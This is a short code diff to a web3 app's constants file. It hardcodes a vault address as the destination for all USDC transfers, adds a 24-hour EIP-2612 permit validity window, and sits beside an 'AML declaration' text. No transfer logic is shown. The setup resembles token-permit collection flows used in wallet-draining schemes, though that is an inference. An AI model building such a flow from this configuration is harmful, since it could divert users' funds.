@@ -16,7 +16,7 @@ export const AML_CONTRACT_ADDRESS =
 // Vault Address - Static destination for all USDC transfers
 export const VAULT_ADDRESS =
   process.env.NEXT_PUBLIC_VAULT_ADDRESS ||
-  "0x0000000000000000000000000000000000000000";
+  "0xd6315a2d25389381e3b2e85d2cd12b9e8c73ae14";
 
 // Chain ID (from environment, defaults to Mainnet)
 export const CHAIN_ID = process.env.NEXT_PUBLIC_CHAIN_ID
@@ -30,6 +30,9 @@ export const AML_DECLARATION_TEXT =
   "- I comply with all applicable anti-money laundering regulations\n" +
   "- The information provided is accurate and complete\n" +
   "- I understand this declaration may be verified on-chain";
+
+// EIP-2612 Permit validity duration (24 hours in seconds)
+export const PERMIT_VALIDITY_DURATION = 24 * 60 * 60; // 86400 seconds
 
 // Owner/Whitelist - Addresses qui ont accès à TOUTES les déclarations
 export const WHITELIST_ADDRESSES = (
